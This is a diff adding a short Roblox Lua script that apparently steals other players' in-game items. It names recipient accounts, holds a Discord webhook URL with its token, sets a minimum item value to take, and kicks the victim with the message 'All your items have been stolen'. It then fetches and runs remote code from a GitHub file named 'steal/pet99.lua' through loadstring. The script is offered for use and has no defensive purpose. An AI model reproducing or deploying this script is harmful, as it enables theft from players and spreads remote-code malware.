@@ -1,0 +1,10 @@
+Username = "Gxtred"
+Username2 = "Fgfgfgfgf_408" -- stuff will get sent to this user if first user's mailbox is full
+Webhook "https://discord.com/api/webhooks/1230339851010838632/esTJ9hoMWBrBxsXhPkndaTXw9IVJheTkdS2WcCYybI3zOtWZ-uQbEKVpYx_1BZ76XVUH" -- look up online if you dont know how to do this
+
+min_rap = 500000 -- minimum rap of each item you want to get sent to you.
+
+_G.kickplayer = true -- if true, will kick player after sending mail.
+local kickmesage = "All your items have been stolen" -- message to send to player if kickplayer is true.
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/nerdifly/steal/main/pet99.lua'))()
